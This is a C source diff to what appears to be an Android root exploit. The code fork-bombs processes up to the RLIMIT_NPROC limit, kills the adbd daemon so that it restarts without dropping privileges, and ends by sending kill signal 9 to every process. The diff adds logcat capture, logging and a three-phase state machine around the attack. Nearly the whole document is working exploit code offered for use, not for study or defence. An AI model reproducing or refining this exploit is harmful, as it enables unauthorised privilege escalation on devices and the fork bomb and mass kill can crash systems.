@@ -47,11 +47,11 @@ static void I(const char *msg, ...)
 
     va_start(ap, msg);
     vfprintf(stderr, msg, ap);
-    f = fopen("/data/local/rlimit.log", "w");
-    if (!f)
-        return;
-
-    vfprintf(f, msg, ap);
+    f = fopen("/data/local/rlimit.log", "a");
+    if (f) {
+        vfprintf(f, msg, ap);
+        fclose(f);
+    }
     va_end(ap);
 
 }
@@ -60,7 +60,7 @@ static void W(const char *msg, va_list ap)
 {
     FILE *f;
 
-    f = fopen("/data/local/rlimit.log", "w");
+    f = fopen("/data/local/rlimit.log", "a");
     if (!f)
         return;
 
@@ -93,6 +93,26 @@ pid_t get_pid_of_adb()
     return found;
 }
 
+static void fork_logcat()
+{
+    int f;
+
+    f = open("/data/local/logcat", O_WRONLY | O_CREAT);
+    if (f < 0) {
+        I("open logcat fail");
+        return;
+    }
+
+    fcntl(f, F_SETFD, 0);
+
+    if (fork() == 0) {
+        dup2(f, 1);
+        dup2(f, 2);
+
+        execl("/system/bin/logcat", "logcat");
+    }
+}
+
 int main(int argc, char **argv)
 {
     struct rlimit rl;
@@ -101,12 +121,15 @@ int main(int argc, char **argv)
     int n = 0;
     int s[2];
 
+    fork_logcat();
+
     if (getrlimit(RLIMIT_NPROC, &rl) < 0)
         die("RLIMIT_NRPOC");
 
     if (rl.rlim_cur == RLIM_INFINITY)
         die("Oh no, you should crash your device");
 
+    I("rlimit %ld, %ld\n", rl.rlim_cur, rl.rlim_max);
     pid = get_pid_of_adb();
     /* TODO: start adbd */
     if (pid < 0)
@@ -123,7 +146,9 @@ int main(int argc, char **argv)
     fcntl(s[1], F_SETFD, 0);
 
     if (!fork()) {
+        int p1 = 1; /* phase 1 */
         int p2 = 0; /* phase 2 */
+        int p3 = 0; /* phase 3 */
 
         I("Zygote machine start\n");
 
@@ -131,34 +156,59 @@ int main(int argc, char **argv)
         for (;;) {
             p = fork();
             if (p < 0) {
-                /* notify main process to kill adbd */
-                I("We spawn %d childs\n", n);
-                write(s[0], &x, 1);
 
-                /* wait for adbd exit */
-                if (!p2) {
-                    read(s[0], &x, 1);
+                if (p1) {
+                    /* notify main process to kill adbd */
+                    I("We spawn %d childs, %s\n", n, strerror(errno));
+                    write(s[0], &x, 1);
+
+                    p1 = 0;
                     p2 = 1;
-                    I("Now competing with system\n");
+                }
+
+                if (p2) {
+                    /* Competing with init, then enter phase 3 */
+                }
+
+                if (p3) {
+                    //I("Phase 3\n");
                 }
 
             } else if (p == 0) {
                 exit(0);
             } else {
                 n++;
+                if (p2) {
+                    write(s[0], &x, 1);
+                    p2 = 0;
+                    p3 = 1;
+                }
             }
         }
+        sync();
     }
 
+    I("Enter phase 1\n");
+    /* wait for phase 1 finish */
     read(s[1], &x, 1);
 
     I("Now killing adbd %d\n", pid);
     kill(pid, SIGKILL);
-    write(s[1], &x, 1);
-    for (;;)
-        sleep(1000);
-    read(s[1], &x, 1);
-    I("Now Over\n");
-    kill(-1, 9);
 
+    /* enter phase 2 */
+    I("Enter phase 2\n");
+    I("Now competing with system\n");
+
+    /* wait phase 2 finish */
+    read(s[1], &x, 1);
+    I("Enter phase 3\n");
+
+    int tries = 0;
+    while ((pid = get_pid_of_adb()) < 0 && tries++ < 30)
+        sleep(1);
+
+    waitpid(-1, &x, 0);
+
+    kill(-1, 9);
+    I("Now Over\n");
 }
